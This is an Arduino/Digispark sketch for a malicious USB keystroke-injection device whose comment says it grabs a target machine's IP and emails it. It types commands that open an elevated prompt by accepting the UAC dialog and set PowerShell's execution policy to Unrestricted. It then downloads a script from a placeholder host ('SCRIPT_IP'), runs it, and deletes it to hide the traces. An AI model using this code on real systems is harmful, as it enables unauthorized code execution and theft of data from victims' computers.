#define kbd_es_es
#include "DigiKeyboardDe.h"

//This Tool will Grap the Ip from the Target Machine and send it to your email.
//German Version

void setup (){
  int d=1000;
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboardDe.print("cmd");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.print("powershell Set-ExecutionPolicy Unrestricted -force");
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.print("exit");
  DigiKeyboard.delay(1000);
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboardDe.print("powershell");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(700);
  DigiKeyboard.delay(600);
  DigiKeyboardDe.print("$WebClient = New-Object System.Net.WebClient");
  DigiKeyboard.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboardDe.print("Invoke-WebRequest -Uri \"SCRIPT_IP\" -OutFile \"ScriptRun1.ps1\"");
  DigiKeyboard.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.print(".\\ScriptRun1.ps1");
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(700);
  DigiKeyboardDe.print("cd..");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);
  DigiKeyboardDe.print("cd..");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);
  DigiKeyboardDe.print("cd..");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);
  DigiKeyboardDe.print("del .\\ScriptRun1.ps1");
  DigiKeyboard.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  
  
  }

void loop ()
{
  
  
  
}
